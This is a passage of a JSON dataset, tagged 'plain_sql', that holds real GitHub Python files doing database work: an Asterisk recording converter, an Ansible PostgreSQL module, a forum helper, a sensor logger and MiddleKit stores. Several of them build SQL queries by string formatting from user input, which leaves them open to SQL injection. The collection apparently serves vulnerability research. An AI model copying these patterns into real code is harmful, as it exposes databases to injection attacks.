        "source": "#!/usr/bin/python3\n\nimport MySQLdb\nimport subprocess\nimport os.path\nimport sys\n\nfile_format = sys.argv[1]\nrecord_files =  subprocess.check_output(['find', '/var/spool/asterisk/monitor/', '-type', 'f', '-name', '*.wav']).decode()\n\nfor wav_file in record_files.splitlines():\n\tname, ext = os.path.splitext(wav_file)\n\tprefer_format_file = \"{}.\".format(name)+file_format\n\tsubprocess.check_output(['ffmpeg', '-i', wav_file, prefer_format_file, '-y'])\n\tos.remove(wav_file)\n\ntry:\n    conn = MySQLdb.connect(host=\"localhost\", db=\"asteriskcdrdb\")\n    cursor = conn.cursor()\n\nexcept Exception as e:\n    error = True\n\ncursor.execute(\"SELECT uniqueid,recordingfile FROM cdr\")\nresult = cursor.fetchall()\nfor unique_id, record_file in result:\n    name, ext = os.path.splitext(record_file)\n    if ext == \".wav\":\n        print(ext)\n        cursor.execute(\"UPDATE cdr SET recordingfile='{}.\".format(name) + file_format + \"'\" + \" WHERE uniqueid='{}'\".format(unique_id))\n        conn.commit()\n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/kostiantyn-nemchenko/ansible-module-postgresql-setting/blob/6bebb6ac05398b7770f3f4bf592731aec12717e8",
        "file_path": "/postgresql_setting.py",
        "source": "#!/usr/bin/python\r\n# -*- coding: utf-8 -*-\r\n\r\nANSIBLE_METADATA = {'status': ['stableinterface'],\r\n                    'supported_by': 'community',\r\n                    'version': '1.0'}\r\n\r\n\r\nDOCUMENTATION = '''\r\n---\r\nmodule: postgresql_setting\r\nshort_description: manage config settings for PostgreSQL instance.\r\ndescription:\r\n  - Change server configuration parameters across the entire database cluster\r\n  - New values will be effective after the next server configuration reload,\r\n    or after the next server restart in the case of parameters that can only\r\n    be changed at server start\r\n  - Only superusers can change configuration settings\r\nauthor: \"Kostiantyn Nemchenko (@kostiantyn-nemchenko)\"\r\nversion_added: \"2.3\"\r\nrequirements:\r\n  - psycopg2\r\noptions:\r\n  login_user:\r\n    description:\r\n      - The username used to authenticate with\r\n    required: false\r\n    default: null\r\n  login_password:\r\n    description:\r\n      - The password used to authenticate with\r\n    required: false\r\n    default: null\r\n  login_host:\r\n    description:\r\n      - Host running the database\r\n    required: false\r\n    default: localhost\r\n  login_unix_socket:\r\n    description:\r\n      - Path to a Unix domain socket for local connections\r\n    required: false\r\n    default: null\r\n  port:\r\n    description:\r\n      - Database port to connect to.\r\n    required: false\r\n    default: 5432\r\n  option:\r\n    description:\r\n      - The parameter from PostgreSQL configuration file\r\n    required: true\r\n    default: null\r\n  value:\r\n    description:\r\n      - The value of the parameter to change\r\n    required: false\r\n    default: null\r\n  state:\r\n    description:\r\n      - The parameter state\r\n    required: false\r\n    default: present\r\n    choices: [ \"present\", \"absent\" ]\r\n'''\r\n\r\n\r\nEXAMPLES = '''\r\n# Set work_mem parameter to 8MB\r\n- postgresql_setting:\r\n    option: work_mem\r\n    value: 8MB\r\n    state: present\r\n\r\n# Allow only local TCP/IP \"loopback\" connections to be made\r\n- postgresql_setting:\r\n    option: listen_addresses\r\n    state: absent\r\n\r\n# Enable autovacuum\r\n- postgresql_setting:\r\n    option: autovacuum\r\n    value: on\r\n'''\r\n\r\n\r\ntry:\r\n    import psycopg2\r\n    import psycopg2.extras\r\nexcept ImportError:\r\n    postgresqldb_found = False\r\nelse:\r\n    postgresqldb_found = True\r\nfrom ansible.module_utils.six import iteritems\r\n\r\n\r\nclass NotSupportedError(Exception):\r\n    pass\r\n\r\n\r\n# ===========================================\r\n# PostgreSQL module specific support methods.\r\n#\r\n\r\ndef option_ispreset(cursor, option):\r\n    \"\"\"Check if option is a preset parameter\r\n    https://www.postgresql.org/docs/current/static/runtime-config-preset.html\r\n    \"\"\"\r\n    query = \"\"\"\r\n    SELECT EXISTS\r\n        (SELECT 1\r\n         FROM pg_settings\r\n         WHERE context = 'internal'\r\n           AND name = '%s')\r\n    \"\"\"\r\n    cursor.execute(query % option)\r\n    return cursor.fetchone()[0]\r\n\r\n\r\ndef option_get_default_value(cursor, option):\r\n    \"\"\"Get parameter value assumed at server startup\"\"\"\r\n    query = \"\"\"\r\n    SELECT boot_val\r\n    FROM pg_settings\r\n    WHERE name = '%s'\r\n    \"\"\"\r\n    cursor.execute(query % option)\r\n    return cursor.fetchone()[0]\r\n\r\n\r\ndef option_isdefault(cursor, option):\r\n    \"\"\"Whether the parameter has not been changed since the last database start or\r\n    configuration reload\"\"\"\r\n    query = \"\"\"\r\n    SELECT boot_val,\r\n           reset_val\r\n    FROM pg_settings\r\n    WHERE name = '%s'\r\n    \"\"\"\r\n    cursor.execute(query % option)\r\n    rows = cursor.fetchone()\r\n    if cursor.rowcount > 0:\r\n        default_value, current_value = rows[0], rows[1]\r\n        return default_value == current_value\r\n    else:\r\n        return False\r\n\r\n\r\ndef option_exists(cursor, option):\r\n    \"\"\"Check if such parameter exists\"\"\"\r\n    query = \"\"\"\r\n    SELECT name\r\n    FROM pg_settings\r\n    WHERE name = '%s'\r\n    \"\"\"\r\n    cursor.execute(query % option)\r\n    return cursor.rowcount > 0\r\n\r\n\r\ndef option_reset(cursor, option):\r\n    \"\"\"Reset parameter if it has non-default value\"\"\"\r\n    if not option_isdefault(cursor, option):\r\n        query = \"ALTER SYSTEM SET %s TO '%s'\"\r\n        cursor.execute(query % (option,\r\n                                option_get_default_value(cursor, option)))\r\n        return True\r\n    else:\r\n        return False\r\n\r\n\r\ndef option_set(cursor, option, value):\r\n    \"\"\"Set new value for parameter\"\"\"\r\n    if not option_matches(cursor, option, value):\r\n        query = \"ALTER SYSTEM SET %s TO '%s'\"\r\n        cursor.execute(query % (option, value))\r\n        return True\r\n    else:\r\n        return False\r\n\r\n\r\ndef option_matches(cursor, option, value):\r\n    \"\"\"Check if setting matches the specified value\"\"\"\r\n    query = \"SELECT current_setting('%s') = '%s'\"\r\n    cursor.execute(query % (option, value))\r\n    return cursor.fetchone()[0]\r\n\r\n\r\n# ===========================================\r\n# Module execution.\r\n#\r\n\r\n\r\ndef main():\r\n    module = AnsibleModule(\r\n        argument_spec=dict(\r\n            login_user=dict(default=\"postgres\"),\r\n            login_password=dict(default=\"\", no_log=True),\r\n            login_host=dict(default=\"\"),\r\n            login_unix_socket=dict(default=\"\"),\r\n            port=dict(default=\"5432\"),\r\n            option=dict(required=True,\r\n                        aliases=['name', 'setting', 'guc', 'parameter']),\r\n            value=dict(default=\"\"),\r\n            state=dict(default=\"present\", choices=[\"absent\", \"present\"]),\r\n        ),\r\n        supports_check_mode=True\r\n    )\r\n\r\n    if not postgresqldb_found:\r\n        module.fail_json(msg=\"the python psycopg2 module is required\")\r\n\r\n    option = module.params[\"option\"]\r\n    value = module.params[\"value\"]\r\n    port = module.params[\"port\"]\r\n    state = module.params[\"state\"]\r\n    changed = False\r\n\r\n    # To use defaults values, keyword arguments must be absent, so\r\n    # check which values are empty and don't include in the **kw\r\n    # dictionary\r\n    params_map = {\r\n        \"login_host\": \"host\",\r\n        \"login_user\": \"user\",\r\n        \"login_password\": \"password\",\r\n        \"port\": \"port\"\r\n    }\r\n    kw = dict((params_map[k], v) for (k, v) in iteritems(module.params)\r\n              if k in params_map and v != '')\r\n\r\n    # If a login_unix_socket is specified, incorporate it here.\r\n    if \"host\" not in kw or kw[\"host\"] == \"\" or kw[\"host\"] == \"localhost\":\r\n        is_localhost = True\r\n    else:\r\n        is_localhost = False\r\n\r\n    if is_localhost and module.params[\"login_unix_socket\"] != \"\":\r\n        kw[\"host\"] = module.params[\"login_unix_socket\"]\r\n\r\n    try:\r\n        db_connection = psycopg2.connect(database=\"postgres\", **kw)\r\n        # Enable autocommit\r\n        if psycopg2.__version__ >= '2.4.2':\r\n            db_connection.autocommit = True\r\n        else:\r\n            db_connection.set_isolation_level(psycopg2\r\n                                              .extensions\r\n                                              .ISOLATION_LEVEL_AUTOCOMMIT)\r\n        cursor = db_connection.cursor(\r\n            cursor_factory=psycopg2.extras.DictCursor)\r\n    except Exception:\r\n        e = get_exception()\r\n        module.fail_json(msg=\"unable to connect to database: %s\" % e)\r\n\r\n    try:\r\n        if option_ispreset(cursor, option):\r\n            module.warn(\r\n                \"Option %s is preset, so it can only be set at initdb \"\r\n                \"or before building from source code. For details, see \"\r\n                \"postgresql.org/docs/current/static/runtime-config-preset.html\"\r\n                % option\r\n            )\r\n        elif option_exists(cursor, option):\r\n            if module.check_mode:\r\n                if state == \"absent\":\r\n                    changed = not option_isdefault(cursor, option)\r\n                elif state == \"present\":\r\n                    changed = not option_matches(cursor, option, value)\r\n                module.exit_json(changed=changed, option=option)\r\n\r\n            if state == \"absent\":\r\n                try:\r\n                    changed = option_reset(cursor, option)\r\n                except SQLParseError:\r\n                    e = get_exception()\r\n                    module.fail_json(msg=str(e))\r\n\r\n            elif state == \"present\":\r\n                try:\r\n                    changed = option_set(cursor, option, value)\r\n                except SQLParseError:\r\n                    e = get_exception()\r\n                    module.fail_json(msg=str(e))\r\n        else:\r\n            module.warn(\"Option %s does not exist\" % option)\r\n    except NotSupportedError:\r\n        e = get_exception()\r\n        module.fail_json(msg=str(e))\r\n    except SystemExit:\r\n        # Avoid catching this on Python 2.4\r\n        raise\r\n    except Exception:\r\n        e = get_exception()\r\n        module.fail_json(msg=\"Database query failed: %s\" % e)\r\n\r\n    module.exit_json(changed=changed, option=option)\r\n\r\n# import module snippets\r\nfrom ansible.module_utils.basic import *\r\nfrom ansible.module_utils.database import *\r\nif __name__ == '__main__':\r\n    main()\r\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/paulc1600/DB-API-Forum/blob/2f8e62dc1adf420827101b78be7926bb16f77d10",
        "file_path": "/forumdb.py",
        "source": "# \"Database code\" for the DB Forum.\n\nimport psycopg2\nimport datetime\n\ndef get_posts():\n  \"\"\"Return all posts from the 'database', most recent first.\"\"\"\n  conn = psycopg2.connect(\"dbname=forum\")\n  cursor = conn.cursor()\n  cursor.execute(\"select content, time from posts order by time desc\")\n  all_posts = cursor.fetchall()\n  conn.close()\n  return all_posts\n\ndef add_post(content):\n  \"\"\"Add a post to the 'database' with the current timestamp.\"\"\"\n  conn = psycopg2.connect(\"dbname=forum\")\n  cursor = conn.cursor()\n  cursor.execute(\"insert into posts values ('%s')\" % content)\n  conn.commit()\n  conn.close()\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/cagta/raspberry_pi/blob/6ba1dbe30f1037196ff0d8b597776ae299f60c51",
        "file_path": "/nrf24/nrf24.py",
        "source": "#!/usr/bin/env python\n\n'''\n\tThis code includes usage of nRF24L01 on Arduino Uno.\n\tConnection table = http://tmrh20.github.io/RF24/\n\n\t@author aatay Tanyldz\n\t@email  cagataytanyildiz[at]protonmail[dot]com\n'''\nimport time\nfrom datetime import datetime\nimport sys\nfrom struct import unpack\nfrom RF24 import RF24\nimport psycopg2\n\nirq_gpio_pin = None\ncon = None\n\nradio = RF24(22, 0)\n\n#EXAMPLE_TIMESTAMPT=strftime(\"%Y-%m-%d %H:%M:%S\", gmtime())\n#EXAMPLE_LOG=\"\"\"INSERT INTO LOGS\n#(HUMIDITY,TEMPERATURE,PRESSURE,AIR_QUALITY,READING_TIME,LOG_TIME,BASE_STATION_ID)\n#VALUES(\"\"\"+str(values[1])+\"','\"+str(values[2])+\"','\"+str(values[3])+\"','\"+values[4]+\"','\"+str(EXAMPLE_TIMESTAMPT)+\"','\"+str(EXAMPLE_TIMESTAMPT)+\"\"\"',1)\n#\"\"\"\n\ndef get_data_from_node():\n\tif radio.available():\n\t\twhile radio.available():\n\t\t\tlength = 10\n\t\t\treceive_payload = radio.read(length)\n\t\t\tvalues = unpack('hhhhh',receive_payload)\n\t\t\tprint \"Node Number: \"+str(values[0])+\"\\nLight: \"+str(values[1])+\" Humidity: \"+str(values[2])+\" Temperature: \"+str(values[3])+\" MQ6: \"+str(values[4])\n\t\t\t#TIMESTAMPT = \"(%s)\",(datetime.now(),)\n\t\t\tLOG=\"INSERT INTO LOGS (HUMIDITY,TEMPERATURE,PRESSURE,AIR_QUALITY,READING_TIME,LOG_TIME,BASE_STATION_ID)\tVALUES(\"+str(values[1])+\",\"+str(values[2])+\",\"+str(values[3])+\",\"+str(values[4])+\",('%s'),('%s'),1);\" % (datetime.now(),datetime.now(),)\n\t\t\twrite_to_db(LOG)\n\ndef write_to_db(LOG):\n\ttry:\n\t\tcon = psycopg2.connect(database='dname', user='uname', password='pass')\n\t\tcon.cursor().execute(LOG)\n\t\tcon.commit()\n\texcept psycopg2.DatabaseError, e:\n\t\tprint 'Error %s' % e\n\t\tsys.exit(1)\n\npipes = [\"0Node\", \"1Node\"]\nradio.begin()\nradio.setRetries(15,15)\nradio.printDetails()\n\nradio.openWritingPipe(pipes[1])\nradio.openReadingPipe(1,pipes[0])\nradio.startListening()\n\nwhile 1:\n\tget_data_from_node()\n\ttime.sleep(0.1)\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/rrbiz662/log-analysis/blob/9852e37695ba3b4ef29ceeb654afe1f4a58471a7",
        "file_path": "/news_data_analysis.py",
        "source": "#!/usr/bin/env python3\nimport psycopg2\n\n\ndef get_top_articles(cur, order, limit):\n    \"\"\"Fetches the top articles.\n\n    Fetches the number of top articles in the specified\n    order.\n\n    Args:\n        cur(obj): The cursor to execute the query.\n        order(str): The order to view the rows in.\n        limit(int): The number of rows to view.\n\n    Return:\n        True if success, False otherwise.\n    \"\"\"\n    query = '''SELECT articles.title, COUNT(*) as views\n            FROM log, articles\n            WHERE log.path LIKE '%'||articles.slug AND\n            log.method = 'GET'\n            GROUP BY articles.title\n            ORDER BY views {}\n            LIMIT {}'''.format(order, limit)\n    rows = get_data(cur, query)\n\n    # Write data to txt file.\n    if rows is not None:\n        file = open(\"top_articles_report.txt\", \"w\")\n        for row in rows:\n            file.write(\"\\\"{}\\\" - {} views \\n\".format(row[0], row[1]))\n        file.close()\n\n        return True\n    else:\n        return False\n\n\ndef get_top_authors(cur, order):\n    \"\"\"Fetches the top authors.\n\n    Args:\n        cur(obj): The cursor to execute the query.\n        order(str): The order to view the rows in.\n\n    Return:\n        True if success, False otherwise.\n    \"\"\"\n    query = '''SELECT authors.name, COUNT(*) as views\n            FROM authors, articles, log\n            WHERE authors.id = articles.author AND\n            log.path LIKE '%'||articles.slug AND\n            log.method = 'GET'\n            GROUP BY authors.name\n            ORDER BY views {}'''.format(order)\n    rows = get_data(cur, query)\n\n    # Write data to txt file.\n    if rows is not None:\n        file = open(\"top_authors_report.txt\", \"w\")\n        for row in rows:\n            file.write(\"{} - {} views \\n\".format(row[0], row[1]))\n        file.close()\n\n        return True\n    else:\n        return False\n\n\ndef get_error_days(cur, error_percent):\n    \"\"\"Fetches the days in which requests led to errors.\n\n    Fetches the days in which the specified percentage\n    of requests led to errors.\n\n    Args:\n        cur(obj): The cursor to execute the query.\n        error_percent(int): The percentage of requests that led to errors.\n\n    Return:\n        True if success, False otherwise.\n    \"\"\"\n    query = '''SELECT to_char(log_errors.date, 'Mon DD YYYY'),\n            round((log_errors.errors * 100\n            / log_requests.total::numeric), 2) as percent\n            FROM log_errors, log_requests\n            WHERE log_errors.date = log_requests.date AND\n            log_errors.errors * 100\n            / log_requests.total::numeric > {}\n            ORDER BY log_errors.date'''.format(error_percent)\n    rows = get_data(cur, query)\n\n    # Write data to txt file.\n    if rows is not None:\n        file = open(\"error_report.txt\", \"w\")\n        for row in rows:\n            file.write(\"{} - {}% errors \\n\".format(row[0], row[1]))\n        file.close()\n\n        return True\n    else:\n        return False\n\n\ndef get_data(cur, query):\n    \"\"\"Fetches the data specified in the query.\n\n    Args:\n        cur(obj): The cursor to execute the query.\n        query(str): The query to execute.\n\n    Return:\n        The data or None if there is an error.\n    \"\"\"\n    try:\n        cur.execute(query)\n        return cur.fetchall()\n    except psycopg2.Error:\n        cur.connection.rollback()\n        return None\n\n\ndef setup_connection(db_name):\n    \"\"\"Sets up the database connection.\n\n    Sets up a Postgre database connection with passed in\n    database's name.\n\n    Args:\n        db_name(str): The name of the database to connect to.\n\n    Returns:\n        A cursor to the database.\n    \"\"\"\n    try:\n        return psycopg2.connect(dbname=db_name)\n    except psycopg2.Error as e:\n        print(e)\n\n\ndef main():\n    \"\"\"Main function to run the code.\"\"\"\n    conn = setup_connection(\"news\")\n\n    if conn is not None:\n        cur = conn.cursor()\n        # Create top articles report.\n        if get_top_articles(cur, \"DESC\", 3):\n            print(\"Successful creating top articles report.\")\n        else:\n            print(\"Error creating top articles report.\")\n        # Create top authors report.\n        if get_top_authors(cur, \"DESC\"):\n            print(\"Successful creating top authors report.\")\n        else:\n            print(\"Error creating top authors report.\")\n        # Create error report.\n        if get_error_days(cur, 1):\n            print(\"Successful creating daily error percentage report.\")\n        else:\n            print(\"Error creating daily error percentage report.\")\n\n        conn.close()\n\nmain()\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Cito/w4py/blob/74f5a03a63f1a93563502b908474aefaae2abda2",
        "file_path": "/MiddleKit/Run/MySQLObjectStore.py",
        "source": "import new\n\nimport MySQLdb\nfrom MySQLdb import Warning\n\nfrom SQLObjectStore import SQLObjectStore\n\n\nclass MySQLObjectStore(SQLObjectStore):\n    \"\"\"MySQLObjectStore implements an object store backed by a MySQL database.\n\n    MySQL notes:\n      * MySQL home page: http://www.mysql.com.\n      * MySQL version this was developed and tested with: 3.22.34 & 3.23.27\n      * The platforms developed and tested with include Linux (Mandrake 7.1)\n        and Windows ME.\n      * The MySQL-Python DB API 2.0 module used under the hood is MySQLdb\n        by Andy Dustman: http://dustman.net/andy/python/MySQLdb/.\n      * Newer versions of MySQLdb have autocommit switched off by default.\n\n    The connection arguments passed to __init__ are:\n      - host\n      - user\n      - passwd\n      - port\n      - unix_socket\n      - client_flag\n      - autocommit\n\n    You wouldn't use the 'db' argument, since that is determined by the model.\n\n    See the MySQLdb docs or the DB API 2.0 docs for more information.\n      http://www.python.org/topics/database/DatabaseAPI-2.0.html\n    \"\"\"\n\n    def __init__(self, **kwargs):\n        self._autocommit = kwargs.pop('autocommit', False)\n        SQLObjectStore.__init__(self, **kwargs)\n\n    def augmentDatabaseArgs(self, args, pool=False):\n        if not args.get('db'):\n            args['db'] = self._model.sqlDatabaseName()\n\n    def newConnection(self):\n        kwargs = self._dbArgs.copy()\n        self.augmentDatabaseArgs(kwargs)\n        conn = self.dbapiModule().connect(**kwargs)\n        if self._autocommit:\n            # MySQLdb 1.2.0 and later disables autocommit by default\n            try:\n                conn.autocommit(True)\n            except AttributeError:\n                pass\n        return conn\n\n    def connect(self):\n        SQLObjectStore.connect(self)\n        if self._autocommit:\n            # Since our autocommit patch above does not get applied to pooled\n            # connections, we have to monkey-patch the pool connection method\n            try:\n                pool = self._pool\n                connection = pool.connection\n            except AttributeError:\n                pass\n            else:\n                def newConnection(self):\n                    conn = self._normalConnection()\n                    try:\n                        conn.autocommit(True)\n                    except AttributeError:\n                        pass\n                    return conn\n                pool._normalConnection = connection\n                pool._autocommit = self._autocommit\n                pool.connection = new.instancemethod(\n                    newConnection, pool, pool.__class__)\n\n    def retrieveLastInsertId(self, conn, cur):\n        try:\n            # MySQLdb module 1.2.0 and later\n            lastId = conn.insert_id()\n        except AttributeError:\n            # MySQLdb module 1.0.0 and earlier\n            lastId = cur.insert_id()\n        # The above is more efficient than this:\n        # conn, cur = self.executeSQL('select last_insert_id();', conn)\n        # id = cur.fetchone()[0]\n        return lastId\n\n    def dbapiModule(self):\n        return MySQLdb\n\n    def _executeSQL(self, cur, sql):\n        try:\n            cur.execute(sql)\n        except MySQLdb.Warning:\n            if not self.setting('IgnoreSQLWarnings', False):\n                raise\n\n    def sqlNowCall(self):\n        return 'NOW()'\n\n\n# Mixins\n\nclass StringAttr(object):\n\n    def sqlForNonNone(self, value):\n        \"\"\"MySQL provides a quoting function for string -- this method uses it.\"\"\"\n        return \"'\" + MySQLdb.escape_string(value) + \"'\"\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Cito/w4py/blob/74f5a03a63f1a93563502b908474aefaae2abda2",
        "file_path": "/MiddleKit/Run/PostgreSQLObjectStore.py",
        "source": "\nconnectionPool = True\ntry:\n    import psycopg2 as dbi  # psycopg2 version 2\n    from psycopg2 import Warning, DatabaseError\n    from psycopg2.extensions import QuotedString\nexcept ImportError:\n    try:\n        import psycopg as dbi  # psycopg version 1\n        from psycopg import Warning, DatabaseError\n        from psycopg.extensions import QuotedString\n    except ImportError:\n        connectionPool = False\n        import pgdb as dbi  # PyGreSQL\n        from pgdb import Warning, DatabaseError\n        def QuotedString(s):\n            return \"'%s'\" % s.replace(\"\\\\\", \"\\\\\\\\\").replace(\"'\", \"''\")\n\nfrom MiscUtils import NoDefault\nfrom MiscUtils.MixIn import MixIn\nfrom MiddleKit.Run.ObjectKey import ObjectKey\nfrom MiddleObject import MiddleObject\n\nfrom SQLObjectStore import SQLObjectStore, UnknownSerialNumberError\n\n\nclass PostgreSQLObjectStore(SQLObjectStore):\n    \"\"\"PostgresObjectStore implements an object store backed by a PostgreSQL database.\n\n    The connection arguments passed to __init__ are:\n      - host\n      - user\n      - passwd\n      - port\n      - unix_socket\n      - client_flag\n\n    You wouldn't use the 'db' argument, since that is determined by the model.\n    \"\"\"\n\n    def augmentDatabaseArgs(self, args, pool=False):\n        if not args.get('database'):\n            args['database'] = self._model.sqlDatabaseName()\n\n    def newConnection(self):\n        args = self._dbArgs.copy()\n        self.augmentDatabaseArgs(args)\n        return self.dbapiModule().connect(**args)\n\n    if connectionPool:\n\n        # psycopg doesn't seem to work well with DBPool. Besides, it does\n        # its own connection pooling internally, so DBPool is unnecessary.\n\n        def setting(self, name, default=NoDefault):\n            if name == 'SQLConnectionPoolSize':\n                return 0\n            return SQLObjectStore.setting(self, name, default)\n\n        # psycopg doesn't like connections to be closed because of pooling\n\n        def doneWithConnection(self, conn):\n            pass\n\n    def newCursorForConnection(self, conn, dictMode=False):\n        return conn.cursor()\n\n    def retrieveNextInsertId(self, klass):\n        seqname = \"%s_%s_seq\" % (klass.name(), klass.sqlSerialColumnName())\n        conn, curs = self.executeSQL(\"select nextval('%s')\" % seqname)\n        value = curs.fetchone()[0]\n        assert value, \"Didn't get next id value from sequence\"\n        return value\n\n    def dbapiModule(self):\n        return dbi\n\n    def _executeSQL(self, cur, sql):\n        try:\n            cur.execute(sql)\n        except Warning:\n            if not self.setting('IgnoreSQLWarnings', False):\n                raise\n\n    def saveChanges(self):\n        conn, cur = self.connectionAndCursor()\n        try:\n            SQLObjectStore.saveChanges(self)\n        except DatabaseError:\n            conn.rollback()\n            raise\n        except Warning:\n            if not self.setting('IgnoreSQLWarnings', False):\n                conn.rollback()\n                raise\n        conn.commit()\n\n    def sqlCaseInsensitiveLike(self, a, b):\n        return \"%s ilike %s\" % (a, b)\n\n    def sqlNowCall(self):\n        return 'now()'\n\n\nclass StringAttr(object):\n\n    def sqlForNonNone(self, value):\n        \"\"\"psycopg provides a quoting function for string -- use it.\"\"\"\n        return \"%s\" % QuotedString(value)\n\n\nclass BoolAttr(object):\n\n    def sqlForNonNone(self, value):\n        if value:\n            return 'TRUE'\n        else:\n            return 'FALSE'\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Cito/w4py/blob/74f5a03a63f1a93563502b908474aefaae2abda2",
        "file_path": "/MiddleKit/Run/SQLObjectStore.py",
        "source": "import sys\n\nfrom MiddleObject import MiddleObject\nfrom ObjectStore import ObjectStore, UnknownObjectError\nfrom ObjectKey import ObjectKey\nfrom MiddleKit.Core.ObjRefAttr import objRefJoin, objRefSplit\nfrom MiscUtils import NoDefault, AbstractError, CSVJoiner\nfrom MiscUtils import Funcs as funcs\nfrom MiscUtils.DBPool import DBPool\nfrom MiscUtils.MixIn import MixIn\n\n\nclass SQLObjectStoreError(Exception):\n    \"\"\"SQL object store error\"\"\"\n\nclass SQLObjectStoreThreadingError(SQLObjectStoreError):\n    \"\"\"SQL object store threading error\"\"\"\n\nclass ObjRefError(SQLObjectStoreError):\n    \"\"\"SQL object store object reference error\"\"\"\n\nclass ObjRefZeroSerialNumError(ObjRefError):\n    \"\"\"SQL object store serial number zero error\"\"\"\n\nclass ObjRefDanglesError(ObjRefError):\n    \"\"\"SQL object store object dangles error\"\"\"\n\n\naggressiveGC = False\n\n\nclass UnknownSerialNumberError(SQLObjectStoreError):\n    \"\"\"For internal use when archiving objects.\n\n    Sometimes an obj ref cannot be immediately resolved on INSERT because\n    the target has not yet been inserted and therefore, given a serial number.\n    \"\"\"\n\n    def __init__(self, info):\n        self.info = info\n\n    def __repr__(self):\n        return '%s: %s' % (self.__class__.__name__, self.info)\n\n    def __str__(self):\n        return str(self.info)\n\n\nclass UnknownSerialNumInfo(object):\n    \"\"\"For internal use when archiving objects.\n\n    Attrs assigned externally are:\n        sourceObject\n        sourceAttr\n        targetObject\n    \"\"\"\n\n    def updateStmt(self):\n        assert self.sourceObject.serialNum() != 0\n        assert self.targetObject.serialNum() != 0\n        sourceKlass = self.sourceObject._mk_klass\n        assert sourceKlass\n        sourceTableName = sourceKlass.sqlTableName()\n        sourceSqlSerialName = sourceKlass.sqlSerialColumnName()\n        return 'update %s set %s where %s=%s;' % (\n            sourceTableName, self.sourceAttr.sqlUpdateExpr(self.targetObject),\n            sourceSqlSerialName, self.sourceObject.serialNum())\n\n    def __repr__(self):\n        s = []\n        for item in self.__dict__.items():\n            s.append('%s=%r' % item)\n        s = ' '.join(s)\n        return '<%s %s>' % (self.__class__.__name__, s)\n\n\nclass SQLObjectStore(ObjectStore):\n    \"\"\"The MiddleKit SQL Object Store.\n\n    TO DO:\n\n      * _sqlEcho should be accessible via a config file setting\n        as stdout, stderr or a filename.\n\n    For details on DB API 2.0, including the thread safety levels see:\n        http://www.python.org/topics/database/DatabaseAPI-2.0.html\n    \"\"\"\n\n\n    ## Init ##\n\n    def __init__(self, **kwargs):\n        # @@ 2001-02-12 ce: We probably need a dictionary before kwargs\n        # for subclasses to pass to us in case they override __init__()\n        # and end up collecting kwargs themselves\n        ObjectStore.__init__(self)\n        self._dbArgs = kwargs\n        self._connected = False\n        self._commited = False\n        self._sqlEcho = None\n        self._sqlCount = 0\n        self._pool = None  # an optional DBPool\n\n    def modelWasSet(self):\n        \"\"\"Perform additional set up of the store after the model is set.\n\n        Performs additional set up of the store after the model is set, normally\n        via setModel() or readModelFileNamed(). This includes checking that\n        threading conditions are valid, and connecting to the database.\n        \"\"\"\n        ObjectStore.modelWasSet(self)\n\n        # Check thread safety\n        self._threadSafety = self.threadSafety()\n        if self._threaded and self._threadSafety == 0:\n            raise SQLObjectStoreThreadingError('Threaded is True,'\n                ' but the DB API threadsafety is 0.')\n\n        # Cache some settings\n        self._markDeletes = self.setting('DeleteBehavior', 'delete') == 'mark'\n\n        # Set up SQL echo\n        self.setUpSQLEcho()\n\n        # Set up attrs for caching\n        for klass in self.model().allKlassesInOrder():\n            klass._getMethods = {}\n            klass._setMethods = {}\n            for attr in klass.allDataAttrs():\n                attr._sqlColumnName = None\n                attr._sqlColumnNames = None\n\n        # use dbargs from settings file as defaults\n        # (args passed to __init__ take precedence)\n        args = self._dbArgs\n        self._dbArgs = self.setting('DatabaseArgs', {})\n        self._dbArgs.update(args)\n        # print 'dbArgs = %s' % self._dbArgs\n\n        # Connect\n        self.connect()\n\n    def setUpSQLEcho(self):\n        \"\"\"Set up the SQL echoing/logging for the store.\n\n        The logging is set up according to the setting 'SQLLog'.\n\n        See the User's Guide for more info. Invoked by modelWasSet().\n        \"\"\"\n        setting = self.setting('SQLLog', None)\n        if setting is None or setting == {}:\n            self._sqlEcho = None\n        else:\n            filename = setting['File']\n            if filename is None:\n                self._sqlEcho = None\n            elif filename == 'stdout':\n                self._sqlEcho = sys.stdout\n            elif filename == 'stderr':\n                self._sqlEcho = sys.stderr\n            else:\n                mode = setting.get('Mode', 'write')\n                assert mode in ['write', 'append']\n                mode = mode[0]\n                self._sqlEcho = open(filename, mode)\n\n\n    ## Connecting to the db ##\n\n    def isConnected(self):\n        return self._connected\n\n    def connect(self):\n        \"\"\"Connect to the database.\n\n        Connects to the database only if the store has not already and provided\n        that the store has a valid model.\n\n        The default implementation of connect() is usually sufficient provided\n        that subclasses have implemented newConnection().\n        \"\"\"\n        assert self._model, 'Cannot connect:' \\\n            ' No model has been attached to this store yet.'\n        if not self._connected:\n            self._connection = self.newConnection()\n            self._connected = True\n            self.readKlassIds()\n            poolSize = self.setting('SQLConnectionPoolSize', 0)\n            if poolSize:\n                args = self._dbArgs.copy()\n                self.augmentDatabaseArgs(args, pool=True)\n                try:\n                    self._pool = DBPool(self.dbapiModule(), poolSize, **args)\n                except TypeError:\n                    if 'database' in args:\n                        del args['database']\n                        self._pool = DBPool(self.dbapiModule(), poolSize, **args)\n                    else:\n                        raise\n\n    def augmentDatabaseArgs(self, args, pool=False):\n        # give subclasses the opportunity to add or change\n        # database arguments\n        pass\n\n    def newConnection(self):\n        \"\"\"Return a DB API 2.0 connection.\n\n        This is a utility method invoked by connect(). Subclasses should\n        implement this, making use of self._dbArgs (a dictionary specifying\n        host, username, etc.) as well as self._model.sqlDatabaseName().\n\n        Subclass responsibility.\n        \"\"\"\n        raise AbstractError(self.__class__)\n\n    def readKlassIds(self):\n        \"\"\"Read the klass ids from the SQL database. Invoked by connect().\"\"\"\n        conn, cur = self.executeSQL('select id, name from _MKClassIds;')\n        try:\n            klassesById = {}\n            for klassId, name in cur.fetchall():\n                assert klassId, 'Id must be a non-zero int.' \\\n                    ' id=%r, name=%r' % (klassId, name)\n                try:\n                    klass = self._model.klass(name)\n                except KeyError:\n                    filename = self._model.filename()\n                    msg = ('%s  The database has a class id for %r in the'\n                        ' _MKClassIds table, but 